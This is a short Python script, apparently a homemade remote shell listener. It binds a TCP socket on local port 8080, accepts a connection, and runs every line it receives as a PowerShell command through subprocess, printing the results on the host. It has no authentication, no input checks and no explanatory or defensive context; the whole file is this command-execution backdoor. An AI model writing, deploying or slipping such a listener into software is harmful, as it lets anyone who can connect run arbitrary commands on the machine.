# /// script
# requires-python = ">=3.11"
# dependencies = []
# ///
import socket
import subprocess

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
print(f'Hostname: {hostname}')
print(f'IP: {ip}') 

addr = ("127.0.0.1",8080)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(addr)
s.listen()
print(f"Waiting connection on port {addr[1]}")
while True:
    socketinfo,returnaddress=s.accept()
    #print(socketinfo)
    #print(returnaddress)
    print(f"connection established from {returnaddress[0]} port {returnaddress[1]}")
    x=""
    while x != "exit":
        data = socketinfo.recv(1024).decode(encoding="utf-8").strip('\n')
        print(data)
        x = data
        commandoutput= subprocess.run(["powershell", "-c", data],capture_output=True, text=True)
        #print(commandoutput.returncode)
        print(commandoutput.stdout)
        print(commandoutput.stderr)
    break
quit()